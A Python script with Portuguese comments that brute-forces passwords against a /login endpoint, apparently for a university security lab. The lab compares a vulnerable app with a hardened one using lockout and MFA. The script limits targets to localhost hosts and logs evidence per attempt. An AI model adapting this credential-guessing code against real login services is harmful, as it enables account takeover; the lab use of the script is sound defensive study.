"""
Brute force de senha contra o endpoint /login de UMA das apps deste projeto.

USO EXCLUSIVO no laboratorio local deste trabalho (apps em localhost).

  python brute_force.py --url http://localhost:5000 --usuario alvo \
      --wordlist wordlist.txt --saida ../evidencias/ataque_vuln_bruteforce.txt

Classifica cada tentativa pelo corpo da resposta (sinais observaveis):
  - "bem-vindo"   -> COMPROMETIMENTO TOTAL (sessao obtida)
  - "duas etapas" -> senha correta, mas MFA barrou (comprometimento parcial)
  - "bloquead"    -> lockout acionado (AC-7)
  - caso contrario -> tentativa falha
"""
import argparse
import sys
import time
from urllib.parse import urlparse

import requests

# REQ-ATQ-06: apenas alvos locais do laboratorio sao permitidos.
ALVOS_PERMITIDOS = {"localhost", "127.0.0.1", "::1", "host.docker.internal",
                    "app_segura", "app_vulneravel"}


def validar_alvo(url: str) -> None:
    host = (urlparse(url).hostname or "").lower()
    if host not in ALVOS_PERMITIDOS:
        raise SystemExit(f"ALVO RECUSADO: '{host}' nao e um alvo local autorizado. "
                         f"Permitidos: {sorted(ALVOS_PERMITIDOS)}")


def classificar(status: int, texto: str) -> str:
    """REQ-ATQ-01: classifica por codigo HTTP e, so entao, pelo conteudo."""
    if status == 429:
        return "BLOQUEADO"
    if status == 401:
        return "FALHA"
    t = texto.lower()
    if "bem-vindo" in t:
        return "SUCESSO_TOTAL"
    if "duas etapas" in t:
        return "MFA_REQUERIDO"
    if "bloquead" in t:
        return "BLOQUEADO"
    return "FALHA"


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", required=True, help="ex.: http://localhost:5000")
    p.add_argument("--usuario", required=True)
    p.add_argument("--wordlist", required=True)
    p.add_argument("--saida", default=None, help="arquivo de evidencia (texto)")
    p.add_argument("--csv", default=None,
                   help="REQ-ATQ-03: grava uma linha por tentativa")
    args = p.parse_args()

    validar_alvo(args.url)   # REQ-ATQ-06

    with open(args.wordlist, encoding="utf-8") as f:
        senhas = [l.strip() for l in f if l.strip()]
    csv_linhas = ["n,senha_mascarada,classificacao,tempo_s"]

    linhas = []

    def log(msg):
        print(msg)
        linhas.append(msg)

    log("=" * 64)
    log(f"ATAQUE DE FORCA BRUTA")
    log(f"Alvo        : {args.url}/login")
    log(f"Usuario     : {args.usuario}")
    log(f"Senhas testar: {len(senhas)}")
    log(f"Inicio      : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    log("=" * 64)

    inicio = time.time()
    resultado_final = "NENHUM_SUCESSO"
    tentativas = 0

    for i, senha in enumerate(senhas, 1):
        sessao = requests.Session()
        t0 = time.time()
        try:
            r = sessao.post(f"{args.url}/login",
                            data={"usuario": args.usuario, "senha": senha},
                            timeout=10, allow_redirects=True)
        except requests.RequestException as e:
            log(f"[{i:02d}] ERRO de conexao: {e}")
            break

        tentativas += 1
        estado = classificar(r.status_code, r.text)
        dt = time.time() - t0
        mascara = senha[0] + "*" * max(len(senha) - 1, 0)
        csv_linhas.append(f"{i},{mascara},{estado},{dt:.3f}")
        log(f"[{i:02d}] senha='{senha}' -> {estado} (HTTP {r.status_code})")

        if estado == "SUCESSO_TOTAL":
            resultado_final = f"COMPROMETIDO com a senha '{senha}'"
            break
        if estado == "MFA_REQUERIDO":
            resultado_final = (f"Senha '{senha}' estava correta, mas o MFA "
                               f"impediu o acesso (IA-2(1)/(2)).")
            break
        if estado == "BLOQUEADO":
            resultado_final = (f"Conta BLOQUEADA apos {tentativas} tentativas "
                               f"(AC-7). Ataque interrompido.")
            break

    dur = time.time() - inicio
    log("=" * 64)
    log(f"RESULTADO   : {resultado_final}")
    log(f"Tentativas  : {tentativas}")
    log(f"Duracao     : {dur:.2f}s")
    log("=" * 64)

    if args.saida:
        with open(args.saida, "w", encoding="utf-8") as f:
            f.write("\n".join(linhas) + "\n")
        print(f"\n[evidencia salva em {args.saida}]")
    if args.csv:
        with open(args.csv, "w", encoding="utf-8") as f:
            f.write("\n".join(csv_linhas) + "\n")
        print(f"[csv por tentativa salvo em {args.csv}]")

    return 0


if __name__ == "__main__":
    sys.exit(main())
